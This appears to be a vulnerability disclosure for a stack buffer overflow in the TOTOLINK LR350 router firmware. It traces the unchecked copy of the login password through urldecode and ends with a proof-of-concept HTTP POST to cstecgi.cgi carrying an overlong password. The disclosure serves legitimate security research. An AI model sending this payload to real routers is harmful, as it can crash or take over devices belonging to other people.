# TOTOLINK LR350 V9.3.5u.6369_B20220309 Stack Overflow

### Product Information

Product: TOTOLINK LR350 Firmware Version: V9.3.5u.6369_B20220309 Manufacturer's website information：https://www.totolink.net/ 

Firmware download address ：[TOTOLINK](https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/231/ids/36.html)

### Analysis

`V7 ` retrieves the value from the ` password ` field input by the user and processes it in the ` urldecode ` function. The processed result is stored in the stack.

![image-20240508121257780]([https://github.com/s4ndw1ch136/IOT-vuln-reports/edit/main/totolink%20LR350/image-20240508121257780.png](https://github.com/s4ndw1ch136/IOT-vuln-reports/blob/main/totolink%20LR350/image-20240508121257780.png))

As shown in the two images below, in the function`urldecode` , the processed (`password`) is written to a buffer  located on the stack. **However, there is no validation to check if the `password` (`a1`) exceeds the length of the buffer (`a2`, `v3`).** Therefore, attackers can hijack the program or cause a DDoS attack by carefully constructing data.

![image-20240508121926199](/image-20240508121926199.png)

![image-20240508121953884](/image-20240508121953884.png)

### POC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.147.140
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 449
Origin: http://192.168.147.140
Connection: close
Referer: http://192.168.147.140/login.html

{"username":"admin","password":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","verify":"0","flag":"0","topicurl":"loginAuth"}
```

![image-20240508122545258](/image-20240508122545258.png)
